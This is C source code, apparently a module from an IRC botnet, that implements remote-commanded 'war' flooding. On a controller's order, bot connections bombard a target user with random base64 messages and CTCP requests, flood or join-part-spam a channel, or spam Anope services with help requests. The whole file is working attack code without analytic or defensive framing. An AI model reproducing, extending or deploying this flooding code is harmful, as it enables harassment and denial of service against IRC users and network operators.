#include "../Includes/includes.h"

#ifndef HTTP_BUILD
#ifdef INCLUDE_IRCWAR
void PrepareWarStatusFlooding()
{
    strcpy(cCurrentWarStatus, "Flooding ");
}

DWORD WINAPI IrcWarFlood(LPVOID)
{
    char cFloodType[25];
    strcpy(cFloodType, cStoreParameter);

    DWORD dwType = dwStoreParameter;
    char cTargetParameter[MAX_IRC_RCV_BUFFER];
    strcpy(cTargetParameter, cWarFloodTargetParam);

    if(dwType == WAR_KILL_USER)
    {
        PrepareWarStatusFlooding();
        strcat(cCurrentWarStatus, cTargetParameter);
    }
    else if(dwType == WAR_FLOOD_CHANNEL)
    {
        PrepareWarStatusFlooding();
        strcat(cCurrentWarStatus, cTargetParameter);
    }
    else if(dwType == WAR_FLOOD_CHANNEL_HOP)
    {
        PrepareWarStatusFlooding();
        strcat(cCurrentWarStatus, cTargetParameter);
    }
    else if(dwType == WAR_FLOOD_ANOPE)
    {
        PrepareWarStatusFlooding();
        strcat(cCurrentWarStatus, "Anope");
    }
    else if(dwType != WAR_KILL_USER_MULTI)
    {
        bWarFlood = FALSE;
        return 0;
    }

    char cWarFloodSend[MAX_IRC_SND_BUFFER];
    DWORD dwCycles = 0;

    while(true)
    {
        if(!bWarFlood)
            break;

        if(dwType == WAR_KILL_USER)
        {
            if(dwCycles == 0)
            {
                for(unsigned short us = 0; us < usRemoteAttemptConnections; us++)
                {
                    strcpy(cWarFloodSend, cIrcCommandPrivmsg);
                    strcat(cWarFloodSend, " ");
                    strcat(cWarFloodSend, cTargetParameter);
                    strcat(cWarFloodSend, " :");
                    strcat(cWarFloodSend, GenerateRandomBase64Data(GetRandNum(MAX_IRC_SND_BUFFER - 10 - strlen(cTargetParameter))));
                    SendToWarIrc(cWarFloodSend, us);
                }
            }
            else if((dwCycles == 1) || (dwCycles == 2))
                SendCtcpToWarIrc(cTargetParameter, TRUE);
            else if((dwCycles == 3) || (dwCycles == 4))
                SendCtcpToWarIrc(cTargetParameter, FALSE);
            else
                bWarFlood = FALSE;
        }
        else if(dwType == WAR_KILL_USER_MULTI)
        {
            char *pcBreakString = strtok(cTargetParameter, " ");
            while(pcBreakString != NULL)
            {
                PrepareWarStatusFlooding();
                strcat(cCurrentWarStatus, pcBreakString);

                for(unsigned short us = 0; us < usRemoteAttemptConnections; us++)
                {
                    strcpy(cWarFloodSend, cIrcCommandPrivmsg);
                    strcat(cWarFloodSend, " ");
                    strcat(cWarFloodSend, pcBreakString);
                    strcat(cWarFloodSend, " :");
                    strcat(cWarFloodSend, GenerateRandomBase64Data(GetRandNum(MAX_IRC_SND_BUFFER - 10 - strlen(cTargetParameter))));
                    SendToWarIrc(cWarFloodSend, us);
                }
                Sleep(IRC_SND_DELAY);

                SendCtcpToWarIrc(pcBreakString, TRUE);
                Sleep(IRC_SND_DELAY);

                SendCtcpToWarIrc(pcBreakString, FALSE);

                if(!bWarFlood)
                    break;

                pcBreakString = strtok(NULL, " ");
            }

            break;
        }
        else if(dwType == WAR_FLOOD_CHANNEL)
        {
            strcpy(cWarFloodSend, cIrcCommandJoin);
            strcat(cWarFloodSend, " ");
            strcat(cWarFloodSend, cTargetParameter);
            SendToAllWarIrcConnections(cWarFloodSend);
            Sleep(IRC_SND_DELAY);

            while(bWarFlood)
            {
                for(unsigned short us = 0; us < usRemoteAttemptConnections; us++)
                {
                    strcpy(cWarFloodSend, cIrcCommandPrivmsg);
                    strcat(cWarFloodSend, " ");
                    strcat(cWarFloodSend, cTargetParameter);
                    strcat(cWarFloodSend, " :");
                    strcat(cWarFloodSend, GenerateRandomBase64Data(GetRandNum(MAX_IRC_SND_BUFFER - 10 - strlen(cTargetParameter))));
                    SendToWarIrc(cWarFloodSend, us);
                }
                Sleep(IRC_SND_DELAY);
            }

            strcpy(cWarFloodSend, cIrcCommandPart);
            strcat(cWarFloodSend, " ");
            strcat(cWarFloodSend, cTargetParameter);
            strcat(cWarFloodSend, " ");
            strcat(cWarFloodSend, GenerateRandomBase64Data(GetRandNum(MAX_IRC_SND_BUFFER - 6 - strlen(cTargetParameter))));
            SendToAllWarIrcConnections(cWarFloodSend);
        }
        else if(dwType == WAR_FLOOD_CHANNEL_HOP)
        {
            strcpy(cWarFloodSend, cIrcCommandJoin);
            strcat(cWarFloodSend, " ");
            strcat(cWarFloodSend, cTargetParameter);
            SendToAllWarIrcConnections(cWarFloodSend);
            Sleep(IRC_SND_DELAY);

            strcpy(cWarFloodSend, cIrcCommandPart);
            strcat(cWarFloodSend, " ");
            strcat(cWarFloodSend, cTargetParameter);
            SendToAllWarIrcConnections(cWarFloodSend);
        }
        else if(dwType == WAR_FLOOD_ANOPE)
        {
            for(unsigned short us = 0; us < usRemoteAttemptConnections; us++)
            {
                strcpy(cWarFloodSend, GenerateRandomHelpMessageToAnope());
                SendToWarIrc(cWarFloodSend, us);
            }
        }

        Sleep(IRC_SND_DELAY);
        dwCycles++;
    }

    if((dwType != WAR_KILL_USER) && (dwType != WAR_KILL_USER_MULTI))
        SendWarFloodStopped(cFloodType, cTargetParameter);
    else if(dwType == WAR_KILL_USER_MULTI)
        SendKillMultipleUsersStop();

    SetWarStatusIdle();
    return 1;
}

void ExecuteWar()
{
    bWarFlood = TRUE;

    while(true)
    {
        HANDLE hThread = CreateThread(NULL, NULL, IrcWarFlood, NULL, NULL, NULL);

        if(hThread)
        {
            CloseHandle(hThread);
            break;
        }

        CloseHandle(hThread);

        Sleep(10);
    }

    if(strstr(cStoreParameter, "flood.anope"))
        strcpy(cWarFloodTargetParam, "Anope Services");

    if(!strstr(cStoreParameter, "kill.user"))
        SendWarFloodStarted(cStoreParameter, cWarFloodTargetParam);
    else if(strstr(cStoreParameter, ".multi"))
        SendKillMultipleUsers(cWarFloodTargetParam);
    else
        SendKillUser(cWarFloodTargetParam);
}

void StartUserFlood(bool bMulti, char *pcParam)
{
    if(bMulti)
        dwStoreParameter = WAR_KILL_USER_MULTI;
    else
        dwStoreParameter = WAR_KILL_USER;

    strcpy(cWarFloodTargetParam, pcParam);
    ExecuteWar();
}

void StartChannelFlood(bool bHop, char *pcParam)
{
    if(bHop)
        dwStoreParameter = WAR_FLOOD_CHANNEL_HOP;
    else
        dwStoreParameter = WAR_FLOOD_CHANNEL;

    strcpy(cWarFloodTargetParam, pcParam);
    ExecuteWar();
}

void StartAnopeFlood()
{
    dwStoreParameter = WAR_FLOOD_ANOPE;
    ExecuteWar();
}
#endif
#endif
